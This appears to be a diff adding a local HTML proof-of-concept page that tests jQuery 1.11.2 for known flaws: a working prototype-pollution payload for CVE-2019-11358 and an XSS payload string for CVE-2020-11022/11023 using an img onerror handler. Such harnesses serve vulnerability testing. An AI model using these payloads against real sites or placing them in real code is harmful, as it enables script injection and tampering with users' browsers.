@@ -1,0 +1,19 @@
+<!-- jquery-poc.html — local test harness, save next to jquery-1.11.2.min.js -->
+<html>
+    <head>
+        <script src="jquery-1.11.2.min.js"></script> <!-- vulnerable version -->
+    </head>
+    <body>
+        <script>
+            // CVE-2019-11358 — prototype pollution
+            $.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "PWNED"}}'));
+            if (({}).polluted === "PWNED") console.log("[+] CVE-2019-11358: Object.prototype polluted");
+
+            // CVE-2020-11022/11023 — XSS via unsanitized HTML passed to DOM sink
+            // In a real scenario, this string comes from an attacker-controlled source
+            // (URL param, postMessage, JSON response, etc.), not hardcoded.
+            var payload = "<option><style></option></select><img src=x onerror=alert(document.domain)>";
+            // $('#sink').html(payload); // uncomment with a div#sink on the page
+        </script>
+    </body>
+</html>
